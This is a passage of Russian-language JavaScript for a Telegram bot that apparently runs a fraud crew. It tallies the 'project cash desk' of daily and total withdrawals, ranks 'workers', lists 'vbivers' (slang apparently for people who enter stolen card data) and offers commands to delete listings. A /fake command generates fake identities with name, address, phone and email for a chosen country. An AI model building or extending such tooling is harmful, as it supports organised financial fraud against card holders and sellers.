      bestDailyResult.length > 0
        ? parseFloat(bestDailyResult[0].get("totalAmount")).toFixed(2)
        : "N/A";
    const bestResultCount =
      bestDailyResult.length > 0 ? bestDailyResult[0].get("totalCount") : "N/A";

    const todayWord = pluralize(profitCountToday, "снятие", "снятия", "снятий");
    const yesterdayWord = pluralize(
      profitCountYesterday,
      "снятие",
      "снятия",
      "снятий"
    );
    const monthWord = pluralize(profitCountMonth, "снятие", "снятия", "снятий");
    const totalWord = pluralize(totalProfitCount, "снятие", "снятия", "снятий");
    const bestWord = pluralize(bestResultCount, "снятие", "снятия", "снятий");

    return ctx.replyOrEdit(
      `🚀 <b>Касса проекта</b>

Сегодня: <b>${parseFloat(kassa_today).toFixed(
        2
      )} USD</b> (<b>${profitCountToday}</b> ${todayWord})
Вчера: <b>${parseFloat(kassa_yesterday).toFixed(
        2
      )} USD</b> (<b>${profitCountYesterday}</b> ${yesterdayWord})
За месяц: <b>${parseFloat(kassa_month).toFixed(
        2
      )} USD</b> (<b>${profitCountMonth}</b> ${monthWord})
Всего: <b>${parseFloat(kassa).toFixed(
        2
      )} USD</b> (<b>${totalProfitCount}</b> ${totalWord})

Максимум за день: <b>${bestResultAmount} USD</b> (<b>${bestResultCount}</b> ${bestWord})
Дата рекорда: <b>${bestResultDate}</b>`,
      {
        reply_markup: Markup.inlineKeyboard([
          Markup.callbackButton("🏆 Топ", "workers_top"),
          Markup.callbackButton("❌ Скрыть", "delete"),
        ]),
        parse_mode: "HTML",
      }
    );
  } catch (err) {
    console.log(err);
    return ctx.reply("❌ Ошибка ").catch((err) => err);
  }
});
bot.hears(/^кто вбивает|на вбиве|вбивер|вбивает|вбейте|вбив$/giu, (ctx) =>
  writers(ctx, false)
);

async function getCitiesByCountry(countryCode) {
  try {
    const response = await axios.get(
      `https://nominatim.openstreetmap.org/search?country=${countryCode}&format=json&limit=10`
    );

    const cities = response.data.map(
      (place) => place.display_name.split(",")[0]
    ); // Берем только название города
    return cities.length ? cities : ["Неизвестный город"];
  } catch (err) {
    console.error("Ошибка получения данных из API:", err);
    return ["Неизвестный город"];
  }
}

bot.command("fake", async (ctx) => {
  const args = ctx.message.text.split(" ");
  const countryCode = args[1]?.toUpperCase(); // Берем код страны (например: UK, DE)

  if (!countryCode) {
    return ctx.reply("⚠️ Укажите код страны. Например: `/fake uk`", {
      parse_mode: "Markdown",
      reply_to_message_id: ctx.message.message_id,
    });
  }

  // Получаем список городов по стране
  const cities = await getCitiesByCountry(countryCode);
  const city = faker.random.arrayElement(cities);

  // Генерация данных
  const fullName = `${faker.name.prefix()} ${faker.name.firstName()} ${faker.name.lastName()} ${faker.name.suffix()}`;
  const street = faker.address.streetName();
  const houseNumber = faker.datatype.number({ min: 1, max: 300 });
  const state = faker.address.state();
  const zipCode = faker.address.zipCode();
  const phoneNumber = faker.phone.phoneNumber("##########");
  const email = faker.internet.email().toLowerCase();

  const fakeData = `
👤 Full Name: <b>${fullName}</b>
🏠 Address: <b>${street} ${houseNumber}</b>
🏙️ City: <b>${city}</b>
🌍 State: <b>${state}</b>
📮 Postal Code: <b>${zipCode}</b>
📞 Phone: <b>${phoneNumber}</b>
🌐 Country: <b>${countryCode}</b>
✉️ Email: <b>${email}</b>
  `;

  ctx.reply(fakeData.trim(), {
    parse_mode: "HTML",
    reply_to_message_id: ctx.message.message_id,
  });
});



bot.command("backup", async (ctx) => {
  if (ctx.chat.id.toString() !== "8168379530") {
    return ctx.reply("⛔️ У вас нет доступа к этой команде!");
  }

  await ctx.reply("📦 Запуск резервного копирования...");

  try {
    await backupProcess();
    await ctx.reply("✅ Резервное копирование завершено!");
  } catch (err) {
    console.error("❌ Ошибка в backupProcess через команду:", err);
    await ctx.reply("❌ Произошла ошибка при создании бэкапа.");
  }
});

const commands = [
  { command: "menu", description: "⚡️ Главное меню" },
  { command: "me", description: "👤 Мой профиль" },
  { command: "vbiv", description: "✍️ Вбиверы" },
  { command: "tp", description: "👨🏼‍💻 Операторы" },
  { command: "top", description: "🏆 Топ воркеров" },
  { command: "kassa", description: "🚀 Касса проекта" },
  { command: "status", description: "⚙️ Статус проекта" },
  { command: "btc", description: "💸 Курс BTC" },
  { command: "del", description: "🗑 Удаление объявлений" },
];
// async function updateUserId() {
//   try {
//     // Находим все логи с userId 6057782326
//     const logs = await Profit.findAll({
//       where: {
//         userId: 8116024846,
//       },
//     });

//     if (logs.length === 0) {
//       console.log("Логи с userId 6057782326 не найдены.");
//       return;
//     }

//     // Обновляем userId у найденных записей
//     await Profit.update({ userId: 7792488654  }, { where: { userId: 8116024846 } });

//     console.log(`Обновлено ${logs.length} записей.`);
//   } catch (error) {
//     console.error("Ошибка при обновлении логов:", error);
//   }
// }

// updateUserId();

// Устанавливаем команды с их описаниями
bot.telegram.setMyCommands(commands);

bot.use(admin);

bot.launch();
